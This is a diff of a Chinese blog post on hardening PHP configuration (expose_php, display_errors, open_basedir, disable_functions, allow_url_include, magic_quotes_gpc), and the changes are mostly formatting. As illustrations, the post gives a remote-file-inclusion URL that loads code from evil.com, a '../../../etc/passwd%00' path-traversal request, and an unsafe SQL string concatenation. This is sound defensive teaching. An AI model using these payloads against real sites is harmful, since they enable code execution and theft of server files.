@@ -1,13 +1,13 @@
 ---
 title: PHP 安全相关的配置
-categories:
-  - 其他
-  - web安全
 tags:
   - php配置
   - web安全
 comments: true
 abbrlink: 31181
+categories:
+  - 其他
+  - web安全
 date: 2019-06-04 23:23:57
 ---
 
@@ -29,8 +29,6 @@ date: 2019-06-04 23:23:57
 
 ***
 
-
-
 #### expose_php = Off
 
 我们经常会在一个http header头里发现这样的信息：
@@ -43,11 +41,11 @@ expose_php = On
 
 该配置项默认为On，需要修改为Off。
 
-P.s 
+P.s
 
 这个配置可以通过自定义header头,覆盖掉
 
-比如写个中间件`` header("X-Powered-By: Young");``
+比如写个中间件``header("X-Powered-By: Young");``
 
 > 附带 隐藏server信息的方式
 >
@@ -55,29 +53,21 @@ P.s
 >
 > nginx 隐藏 server
 >
-> 修改nginx.conf  在http里面设置 
+> 修改nginx.conf  在http里面设置
 >
 > server_tokens off;
 >
 > apache 隐藏 server
 >
-> 修改httpd.conf 设置 
+> 修改httpd.conf 设置
 >
 > ServerSignature Off
 >
 > ServerTokens Prod
 
-
-
-
-
-
-
 #### display_errors = Off
 
 此控制项控制PHP是否将error、notice、warning日志打印出来，以及打印的位置。错误信息主要用于辅助开发，但是在线上环境却非常危险，因为这样将会把服务端的WebServer、数据库、PHP代码部署路径，甚至是数据库连接、数据表等关键信息暴露出去，为攻击者带来极大便利。所以建议产品上线时修改为Off。
-
-
 
 #### error_reporting = E_ALL& ~E_NOTICE
 
@@ -87,7 +77,7 @@ P.s
 
 ```php
 <?php
-	// 假如用户请求中无username 参数，则会打印notice错误
+ // 假如用户请求中无username 参数，则会打印notice错误
     // 假如用户请求中无username 参数，则会打印notice错误
     $username = $_GET[‘username’];
     // 引用一个未初始化的变量var2
@@ -106,8 +96,6 @@ PHP Notice: Undefined variable: var2 in /somepath/test.php on line 6
 
 攻击者会利用这些信息，猜测代码逻辑，使得攻击变得更方便。
 
-
-
 #### display_startup_errors =Off
 
 php启动时产生的错误由此选项进行控制，这个和display_errors是分开的。为了避免PHP进城启动时产生的错误被打印到页面上而造成信息泄漏，此选项在线上服务也应该被配置为Off。
@@ -116,9 +104,7 @@ php启动时产生的错误由此选项进行控制，这个和display_errors是
 
 由此我们可以看出，正确的PHP基础安全配置可有效避免很多高危漏洞，避免泄漏服务器敏感信息，从而提升产品的安全性。
 
-
-
-#### 控制php脚本能访问的目录 
+#### 控制php脚本能访问的目录
 
 使用open_basedir选项能够控制PHP脚本只能访问指定的目录，
 
@@ -130,9 +116,7 @@ php启动时产生的错误由此选项进行控制，这个和display_errors是
 open_basedir = D:/usr/www
 ```
 
-
-
-#### 关闭危险函数 
+#### 关闭危险函数
 
 如果打开了安全模式，那么函数禁止是可以不需要的，但是我们为了安全还是考虑进去。
 
@@ -152,17 +136,13 @@ disable_functions = chdir,chroot,dir,getcwd,opendir,readdir,scandir,fopen,unlink
 
 以上只是列了部分不叫常用的文件处理函数，你也可以把上面执行命令函数和这个函数结合，就能够抵制大部分的phpshell了。
 
-
-
 ### php7 无需修改的配置
 
 ***
 
-
-
 #### allow_url_include =Off
 
-PHP通过此选项控制是否允许通过include/require来执行一个远程文件(如http://evil.com/evil.php或ftp://evil.com/evil.php)。
+PHP通过此选项控制是否允许通过include/require来执行一个远程文件(如<http://evil.com/evil.php或ftp://evil.com/evil.php>)。
 
 代码示例如下：
 
@@ -181,21 +161,17 @@ if (!include_once($strParam.’.php’)){
 
 ```
 
-假如用户访问如下的URL，访问页面中的$strParam将被设置为一个远程的URL：http://evil.com/evil.php。如果此配置被设置为on，那么test.php会通过include_once执行远程服务器上的PHP文件（http://evil.com/evil.php），后果不言而喻。
+假如用户访问如下的URL，访问页面中的$strParam将被设置为一个远程的URL：<http://evil.com/evil.php。如果此配置被设置为on，那么test.php会通过include_once执行远程服务器上的PHP文件（http://evil.com/evil.php>），后果不言而喻。
 
-   http://HostA/test.php?param=http://evil.com/evil
+   <http://HostA/test.php?param=http://evil.com/evil>
 
 所以建议此选项强制配置为Off。
 
 当然要彻底解决上述代码的安全漏洞，除了规范PHP配置，还需要规范PHP编码。
 
-
-
 ### php7 已经废弃的配置
 
 ***
-
-
 
 #### register_globals = Off
 
@@ -235,8 +211,6 @@ PHP在进程启动时，会根据**register_globals**的设置，判断是否将
 
 **从 PHP 5.3.0 起不推荐使用。 在 PHP 5.4.0 中移除该选项**
 
-
-
 #### magic_quotes_gpc = on
 
 举一个典型的SQL注入示例，假如SQL语句用如下方式拼接：
@@ -253,7 +227,7 @@ select * from user where pass=’ “. $_GET[‘passwd’]. ”' and user='” .
 
 由于’已经被转义，SQL语句不能被成功执行，从而防止SQL注射。
 
-另外，以小节2中的http://HostA/test.php为例，当magic_quotes_gpc= Off的情况下，用户提交一个example.php?param=../../../etc/passwd%00请求，由于代码中限制的文件后缀（.php）将被%00截断，就会通过require_once尝试读取/etc/passwd文件。
+另外，以小节2中的<http://HostA/test.php为例，当magic_quotes_gpc>= Off的情况下，用户提交一个example.php?param=../../../etc/passwd%00请求，由于代码中限制的文件后缀（.php）将被%00截断，就会通过require_once尝试读取/etc/passwd文件。
 
 值得注意的是，magic_quotes_gpc配置为On时，有以下缺点：
 
@@ -294,9 +268,6 @@ $aa=str_replace('<','&lt;',$aa);
 
 **P.s 总结php接收参数最安全的做法就是全部转义**
 
-
-
 ## 参考
 
-https://www.php.net/manual/zh/ini.php
-
+<https://www.php.net/manual/zh/ini.php>
